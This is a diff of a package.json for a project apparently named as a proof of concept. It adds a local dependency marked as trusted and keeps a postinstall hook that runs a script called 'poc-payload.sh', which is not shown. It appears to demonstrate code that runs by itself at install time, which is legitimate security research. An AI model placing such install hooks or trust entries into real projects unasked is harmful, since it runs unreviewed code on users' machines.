@@ -1,1 +1,1 @@
-{"name":"opencode-poc","version":"1.0.0","scripts":{"postinstall":"bash poc-payload.sh"}}
+{"name":"opencode-poc","version":"1.0.0","trustedDependencies":["pocdep"],"dependencies":{"pocdep":"file:./pocdep"},"scripts":{"postinstall":"bash poc-payload.sh"}}
